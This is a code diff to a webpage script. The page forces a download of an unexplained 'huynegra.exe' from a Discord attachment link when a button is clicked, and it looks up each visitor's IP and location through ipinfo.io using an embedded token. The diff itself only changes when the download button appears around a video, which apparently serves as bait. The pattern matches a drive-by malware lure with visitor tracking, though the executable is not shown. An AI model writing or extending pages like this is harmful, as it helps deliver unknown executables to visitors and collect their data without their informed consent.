@@ -19,17 +19,26 @@ function downloadFile() {
     link.href = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe";
     link.download = "huynegra.exe";
     link.click();
-
-    var video = document.getElementById("video");
-    video.play();
 }
 
 var buttonContainer = document.getElementById("button-container");
-buttonContainer.addEventListener("click", downloadFile);
+buttonContainer.addEventListener("click", function(event) {
+    if (event.target === buttonContainer) {
+        downloadFile();
+    }
+});
 
 var video = document.getElementById("video");
 video.controls = false;
 video.loop = false;
+
+video.addEventListener("play", function() {
+    buttonContainer.style.display = "none";
+});
+
+video.addEventListener("ended", function() {
+    buttonContainer.style.display = "block";
+});
 
 fetch("https://ipinfo.io/json?token=a5fdbd840e0610")
     .then((response) => response.json())
